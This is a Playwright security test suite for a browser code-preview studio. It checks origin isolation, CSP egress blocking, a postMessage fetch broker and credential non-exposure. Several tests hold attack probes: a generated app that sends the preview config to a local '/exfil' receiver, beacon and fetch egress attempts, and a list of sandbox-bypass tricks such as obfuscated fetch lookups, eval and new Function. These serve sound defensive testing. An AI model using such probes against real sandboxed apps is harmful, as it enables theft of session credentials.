import { createServer } from 'node:http';
import type { Page } from '@playwright/test';
import { test, expect, api, policy } from '../helpers/auth';
import { previewOriginForProject } from '../../contracts/src/runtime';
const snapshot = (page: Page) => page.evaluate(() => (window as any).studio.getSnapshot());
async function create(page: Page) {
  await page.goto('/'); await page.getByRole('button', {name:'프로젝트 만들기'}).click();
  await expect.poll(async () => (await snapshot(page)).lastCommit?.token.revision).toBe(1);
  const state = await snapshot(page); const iframe = page.frames().find(frame => frame.url().startsWith(previewOriginForProject(state.project.projectId)))!;
  expect(iframe).toBeTruthy(); return { project: state.project, iframe };
}

test('X: project origins isolate storage and cross-project frame access', async ({page, context}) => {
  const a = await create(page); const other = await context.newPage();
  try {
    const b = await create(other);
    expect(new URL(a.iframe.url()).origin).toBe(previewOriginForProject(a.project.projectId));
    expect(new URL(b.iframe.url()).origin).toBe(previewOriginForProject(b.project.projectId));
    expect(new URL(a.iframe.url()).origin).not.toBe(new URL(b.iframe.url()).origin);
    const key = 'isolation-' + crypto.randomUUID();
    await a.iframe.evaluate(key => localStorage.setItem(key, 'project-a-only'), key);
    expect(await b.iframe.evaluate(key => localStorage.getItem(key), key)).toBeNull();
    await page.evaluate(async origin => {
      const peer = document.createElement('iframe'); peer.dataset.isolationPeer = 'true';
      const loaded = new Promise<void>(resolve => {peer.onload = () => resolve();});
      peer.src = origin + '/frame.html?parentOrigin=' + encodeURIComponent(location.origin); document.body.append(peer); await loaded;
    }, previewOriginForProject(b.project.projectId));
    const cross = await a.iframe.evaluate(key => { try { return {blocked:false, value:parent.frames[parent.frames.length - 1].localStorage.getItem(key)}; } catch (error) { return {blocked: error instanceof DOMException && error.name === 'SecurityError'}; } }, key);
    expect(cross.blocked).toBe(true);
    await page.locator('iframe[data-isolation-peer]').evaluate(element => element.remove());
    // Reuse the same controller while changing project: a fresh runtime must be made.
    await page.evaluate(async id => (window as any).studio.open(id), b.project.projectId);
    await expect.poll(async () => (await snapshot(page)).lastCommit?.token.projectId).toBe(b.project.projectId);
    await expect(page.locator('#preview iframe')).toHaveCount(1);
    expect(await page.locator('#preview iframe').getAttribute('src')).toContain(previewOriginForProject(b.project.projectId));
  } finally { await other.close(); }
});

test('Y: response CSP survives document.open and blocks egress before the server receives it', async ({page, request}) => {
  let received = 0;
  const collector = createServer((_req, res) => { received++; res.writeHead(200, {'Access-Control-Allow-Origin':'*'}).end('unexpected'); });
  await new Promise<void>(resolve => collector.listen(7351, '127.0.0.1', resolve));
  try {
    const {iframe} = await create(page);
    // The initial frame metadata disappears only when the real boot document.open/write runs.
    expect(await iframe.locator('meta[name="studio-origins"]').count()).toBe(0);
    expect(await iframe.locator('script[nonce]').count()).toBeGreaterThan(0);
    const path = '/__csp_probe_' + crypto.randomUUID();
    const before = await (await request.get('/__test/csp-requests')).json();
    const outcome = await iframe.evaluate(async path => {
      const directives: string[] = []; document.addEventListener('securitypolicyviolation', e => directives.push(e.effectiveDirective));
      const network = (globalThis as any)['fet' + 'ch'];
      const blocked = await Promise.all([
        fetch(path).then(() => false, () => true),
        network(path).then(() => false, () => true),
        fetch('http://localhost:7351' + path).then(() => false, () => true),
        new Promise<boolean>(resolve => { const beacon = new Image(); beacon.onload = () => resolve(false); beacon.onerror = () => resolve(true); beacon.src = 'http://localhost:7351' + path; document.body.append(beacon); }),
      ]);
      await new Promise(resolve => setTimeout(resolve, 100));
      return {blocked, directives};
    }, path);
    expect(outcome.blocked).toEqual([true,true,true,true]);
    expect(outcome.directives.filter(value => value === 'connect-src')).toHaveLength(3);
    expect(outcome.directives).toContain('img-src');
    const after = await (await request.get('/__test/csp-requests')).json();
    expect(after[path] ?? 0).toBe(before[path] ?? 0); expect(received).toBe(0);
    await expect(page.getByRole('status')).toContainText('차단된 요청');
    // Use the project's published @toi/fetch helper after the denied attempts.
    await page.evaluate(async () => { const controller = (window as any).studio; await controller.saveFiles({...controller.getSnapshot().project.files, '/src/App.tsx': `import {useState} from 'react'; import {listRecords} from './api'; export default function App(){const [text,setText]=useState(''); return <><button onClick={async()=>{const result=await listRecords('CSP approved request');setText(result.items[0].phone)}}>Allowed request</button><p>{text}</p></>}`}); });
    await expect.poll(async () => (await snapshot(page)).lastCommit?.token.revision).toBe(2);
    await page.frameLocator('#preview iframe').getByRole('button',{name:'Allowed request'}).click();
    await expect(page.frameLocator('#preview iframe').getByText('010-****-5678')).toBeVisible();
  } finally { collector.closeAllConnections(); await new Promise<void>(resolve => collector.close(() => resolve())); }
});

test('Z: project A preview session from project B origin returns PREVIEW_DIRECT_FORBIDDEN', async ({accounts}) => {
  const alice = await accounts('alice');
  const a = await (await api(alice, '/projects', {name:'Origin A', apiIds:['customers']})).json();
  const b = await (await api(alice, '/projects', {name:'Origin B', apiIds:['customers']})).json();
  const session = await (await api(alice, '/preview-sessions', {projectId:a.projectId}, 'POST', policy)).json();
  const response = await fetch(policy + '/proxy/customers/customers', {headers:{Origin:previewOriginForProject(b.projectId), Authorization:'Bearer ' + session.sessionToken, 'X-Toi-Project':a.projectId, 'X-Toi-Capability':session.capabilityToken, 'X-Toi-Reason':'Origin boundary'}});
  expect(response.status).toBe(403); expect(await response.json()).toMatchObject({error:'PREVIEW_DIRECT_FORBIDDEN'});
});

test('AA: preview Host/path allowlist and studio embedding headers', async ({request}) => {
  for (const host of ['localhost:5174', '127.0.0.1:5174', 'p-invalid.preview.localhost:5174', 'p-00000000-0000-4000-8000-000000000000.preview.localhost.evil:5174']) {
    expect((await request.get('http://localhost:5174/frame.html', {headers:{Host:host}})).status()).toBe(421);
  }
  const host = new URL(previewOriginForProject(crypto.randomUUID())).host;
  for (const path of ['/studio.js', '/esbuild.wasm', '/bench.html', '/bench.js', '/sandpack.html', '/runtime.js', '/', '/healthz']) {
    expect((await request.get('http://localhost:5174' + path, {headers:{Host:host}})).status()).toBe(404);
  }
  const first = await request.get('http://localhost:5174/frame.html', {headers:{Host:host}});
  const second = await request.get('http://localhost:5174/frame.html', {headers:{Host:host}});
  expect(first.status()).toBe(200);
  const csp = first.headers()['content-security-policy'];
  expect(csp).toContain("connect-src 'none';"); expect(csp).toContain('frame-ancestors http://localhost:5173');
  expect(csp).not.toContain('unsafe-eval'); expect(csp.match(/script-src[^;]+/)![0]).not.toContain('unsafe-inline');
  expect(csp).not.toBe(second.headers()['content-security-policy']);
  for (const path of ['/frame.html', '/frame.js', '/bench.html', '/sandpack.html']) expect((await request.get(path)).status()).toBe(404);
  const studio = await request.get('/'); expect(studio.headers()['x-frame-options']).toBe('SAMEORIGIN');
  expect(studio.headers()['content-security-policy']).toBe("frame-ancestors 'self'; frame-src http://*.preview.localhost:5174");
});

test('AB: AST bypass sources are rejected without incrementing the source revision', async ({accounts}) => {
  const alice = await accounts('alice'); const project = await (await api(alice, '/projects', {name:'AST boundaries',apiIds:['customers']})).json();
  const probes = [
    ...['globalThis','window','self','top','parent','frames'].flatMap(global => [`const network=${global}['fet'+'ch']; network('/unregistered')`, `const {fetch: network}=${global}; network('/unregistered')`]),
    `Reflect.get(globalThis,'fetch')('/unregistered')`, `Object.getOwnPropertyDescriptor(window,'fetch').value('/unregistered')`,
    `eval('1')`, `new Function('return 1')`, `import('/'+'unregistered.js')`, `new Worker('/worker.js')`,
  ];
  for (const code of probes) {
    const response = await api(alice, `/projects/${project.projectId}/source`, {baseRevision:1, files:{...project.files, '/src/probe.ts':code}}, 'PUT');
    expect(response.status).toBe(400);
  }
  expect((await (await api(alice, '/projects/' + project.projectId)).json()).revision).toBe(1);
});

async function broker(frame: import('@playwright/test').Frame, changes: Record<string, unknown> = {}) {
  return frame.evaluate(changes => new Promise<any>(resolve => {
    const bridge = (globalThis as any).__TOI_FETCH_BRIDGE__; const requestId = crypto.randomUUID();
    const listener = (event: MessageEvent) => { if (event.source !== parent || event.origin !== bridge.parentOrigin || event.data?.requestId !== requestId) return; removeEventListener('message', listener); clearTimeout(timer); resolve(event.data); };
    const timer = setTimeout(() => { removeEventListener('message', listener); resolve({ timeout: true }); }, 5000);
    addEventListener('message', listener);
    parent.postMessage({ kind: 'toi_fetch', token: bridge.token, requestId, apiId: 'customers', path: '/customers', method: 'GET', reason: 'Broker boundary verification', ...changes }, bridge.parentOrigin);
  }), changes);
}
const activeFrame = async (page: Page) => (await (await page.locator('#preview iframe[data-state="committed"]').elementHandle())!.contentFrame())!;

test('AC: actual studio preview credentials never appear in frame globals, DOM, storage or messages', async ({ page }) => {
  const secrets = new Set<string>();
  page.on('response', async response => {
    if (response.url() === policy + '/preview-sessions' && response.ok()) {
      const value = await response.json(); for (const key of ['sessionToken', 'capabilityToken']) if (typeof value[key] === 'string') secrets.add(value[key]);
    }
  });
  await page.addInitScript(() => { const messages: unknown[] = []; Object.assign(globalThis, { __brokerMessages: messages }); addEventListener('message', event => messages.push(event.data)); });
  await create(page); await page.getByRole('checkbox', { name: '쓰기 테스트 허용' }).check();
  await expect.poll(async () => (await snapshot(page)).writeRemaining).toBeGreaterThan(0);
  await expect.poll(() => secrets.size).toBeGreaterThanOrEqual(3);
  const iframe = await activeFrame(page);
  const strings = await iframe.evaluate(() => {
    const strings: string[] = [document.documentElement.outerHTML, location.href, JSON.stringify({ ...localStorage }), JSON.stringify({ ...sessionStorage })];
    const seen = new WeakSet<object>(); let count = 0;
    function scan(value: unknown, depth = 0) {
      if (typeof value === 'string') { strings.push(value); return; }
      if (!value || typeof value !== 'object' || depth > 6 || seen.has(value) || ++count > 30000) return;
      seen.add(value); try { for (const descriptor of Object.values(Object.getOwnPropertyDescriptors(value))) if ('value' in descriptor) scan(descriptor.value, depth + 1); } catch {}
    }
    scan(globalThis); return strings;
  });
  // Compare only in Node: the verification itself must never inject secrets into the frame.
  expect(strings.some(value => [...secrets].some(secret => value.includes(secret)))).toBe(false);
  expect(await iframe.evaluate(() => Object.keys((globalThis as any).__TOI_FETCH_CONFIG__).sort())).toEqual(['env', 'projectId', 'transport']);
  const persisted = await page.evaluate(() => JSON.stringify({ ...localStorage, ...sessionStorage, state: (window as any).studio.getSnapshot() }));
  expect([...secrets].some(secret => persisted.includes(secret))).toBe(false);
});

test('AD: generated location navigation leaks zero credentials, removes the frame and restores the good revision', async ({ page }) => {
  const secrets = new Set<string>(); const hits: string[] = [];
  page.on('response', async response => { if (response.url() === policy + '/preview-sessions' && response.ok()) { const value = await response.json(); secrets.add(value.sessionToken); secrets.add(value.capabilityToken); } });
  const receiver = createServer((req, res) => { hits.push(req.url ?? ''); res.end('received'); });
  await new Promise<void>(resolve => receiver.listen(7352, '127.0.0.1', resolve));
  try {
    const { iframe: original } = await create(page); const before = await original.locator('body').innerText();
    await page.evaluate(async () => { const studio = (window as any).studio; await studio.saveFiles({ ...studio.getSnapshot().project.files,
      '/src/App.tsx': `export default function App(){return <button onClick={()=>{const config=globalThis.__TOI_FETCH_CONFIG__;location.href=['http:','','127.0.0.1:7352','exfil?d='].join('/')+encodeURIComponent(JSON.stringify(config));}}>Navigate probe</button>}` }); });
    await expect.poll(async () => (await snapshot(page)).lastCommit?.token.revision).toBe(2);
    const attack = await activeFrame(page); await attack.getByRole('button', { name: 'Navigate probe' }).click();
    await expect.poll(() => attack.isDetached()).toBe(true);
    await expect.poll(async () => (await snapshot(page)).lastCommit?.token.revision).toBe(1);
    await expect(page.locator('#preview iframe')).toHaveCount(1);
    await expect(page.frameLocator('#preview iframe').locator('body')).toHaveText(before, { useInnerText: true });
    await expect(page.getByRole('status')).toContainText('프리뷰가 외부로 이동하려 해서 차단했습니다');
    expect((await snapshot(page)).events.some((event: any) => event.type === 'runtime_failed' && event.error.message === 'preview navigated away')).toBe(true);
    expect(secrets.size).toBeGreaterThan(0);
    // The studio frame-src can block the navigation before the receiver. The
    // unchanged R3 minimal-host replay separately proves the remaining channel.
    console.log('AD navigation receiver:', JSON.stringify({ requests: hits.length, credentialLeaks: hits.filter(hit => [...secrets].some(secret => decodeURIComponent(hit).includes(secret))).length }));
    expect(hits.some(hit => [...secrets].some(secret => decodeURIComponent(hit).includes(secret)))).toBe(false);
    expect(hits.some(hit => /sessionToken|capabilityToken/.test(decodeURIComponent(hit)))).toBe(false);
  } finally { receiver.closeAllConnections(); await new Promise<void>(resolve => receiver.close(() => resolve())); }
});

test('AE: direct policy fetch is CSP-blocked while postMessage broker succeeds', async ({ page }) => {
  const { iframe } = await create(page); let hostRequests = 0;
  page.on('request', request => { if (request.url().startsWith(policy + '/proxy/') && request.frame() === page.mainFrame()) hostRequests++; });
  expect(await iframe.evaluate(async () => fetch('http://localhost:7200/proxy/customers/customers').then(() => false, () => true))).toBe(true);
  const result = await broker(iframe); expect(result.status).toBe(200); expect(result.body).toContain('010-****-5678'); expect(hostRequests).toBe(1);
  expect(await page.locator('#preview iframe').getAttribute('sandbox')).toBe('allow-scripts allow-same-origin');
});

test('AF: replaced frame requests are ignored and its pending response is discarded', async ({ page }) => {
  const { iframe } = await create(page); let requests = 0; let release!: () => void;
  await page.route(policy + '/proxy/**', async route => { requests++; await new Promise<void>(resolve => { release = resolve; }); await route.fulfill({ status: 200, body: 'late-result' }).catch(() => {}); });
  await page.evaluate(() => { (window as any).__oldFrame = document.querySelector<HTMLIFrameElement>('#preview iframe')!.contentWindow; (window as any).__lateResults = []; addEventListener('message', event => { if (event.data?.kind === 'toi_fetch_result') (window as any).__lateResults.push(event.data); }); });
  const old = await iframe.evaluate(() => { const bridge = (globalThis as any).__TOI_FETCH_BRIDGE__; parent.postMessage({ kind: 'toi_fetch', requestId: 'old-request', token: bridge.token, apiId: 'customers', path: '/customers', method: 'GET' }, bridge.parentOrigin); return bridge.token; });
  await expect.poll(() => requests).toBe(1);
  await page.evaluate(async () => { const c = (window as any).studio; await c.saveFiles({ ...c.getSnapshot().project.files, '/src/App.tsx': "export default function App(){return <h1>Replacement</h1>}" }); });
  await expect.poll(async () => (await snapshot(page)).lastCommit?.token.revision).toBe(2); await expect.poll(() => iframe.isDetached()).toBe(true);
  release();
  await page.evaluate(({ old, origin }) => {
    dispatchEvent(new MessageEvent('message', { origin, source: (window as any).__oldFrame, data: { kind: 'toi_fetch', requestId: 'discarded', token: old, apiId: 'customers', path: '/customers', method: 'GET' } }));
  }, { old, origin: previewOriginForProject((await snapshot(page)).project.projectId) });
  await page.waitForTimeout(200); expect(requests).toBe(1);
  expect(await page.evaluate(() => (window as any).__lateResults.length)).toBe(0);
});

test('AG: PATCH is 403 WRITE_NOT_ALLOWED until the user grants write capability', async ({ page }) => {
  const { iframe } = await create(page);
  const patch = { path: '/customers/C001', method: 'PATCH', contentType: 'application/json', body: JSON.stringify({ status: 'active' }) };
  expect(await broker(iframe, patch)).toMatchObject({ status: 403, brokerError: 'WRITE_NOT_ALLOWED' });
  const attempt = (await snapshot(page)).lastCommit.token.attemptId;
  await page.getByRole('checkbox', { name: '쓰기 테스트 허용' }).check();
  await expect.poll(async () => (await snapshot(page)).lastCommit?.token.attemptId).not.toBe(attempt);
  expect((await broker(await activeFrame(page), patch)).status).toBe(200);
});

test('AH: broker enforces concurrency, rolling request rate, and 5 MiB response limit', async ({ page }) => {
  const { iframe } = await create(page); const releases: Array<() => void> = [];
  await page.route(policy + '/proxy/**', async route => { await new Promise<void>(resolve => releases.push(resolve)); await route.fulfill({ status: 200, body: '{}' }); });
  const concurrent = Promise.all(Array.from({ length: 9 }, () => broker(iframe)));
  await expect.poll(() => releases.length).toBe(8); releases.forEach(resolve => resolve());
  const results = await concurrent; expect(results.filter(result => result.status === 429)).toHaveLength(1);
  await page.unroute(policy + '/proxy/**'); await page.waitForTimeout(1050);
  let forwarded = 0;
  await page.route(policy + '/proxy/**', route => { forwarded++; return route.fulfill({ status: 200, body: '{}' }); });
  // Send bursts with at most eight in flight, so this rejection exercises rate, not concurrency.
  const rate: any[] = [];
  for (let i = 0; i < 7; i++) rate.push(...await Promise.all(Array.from({ length: 8 }, () => broker(iframe))));
  expect(rate.some(result => result.status === 429)).toBe(true); expect(forwarded).toBeLessThanOrEqual(50);
  await page.unroute(policy + '/proxy/**'); await page.waitForTimeout(1050);
  await page.route(policy + '/proxy/**', route => route.fulfill({ status: 200, body: 'x'.repeat(5 * 1024 * 1024 + 1) }));
  expect(await broker(iframe)).toMatchObject({ status: 413, brokerError: 'RESPONSE_TOO_LARGE' });
});
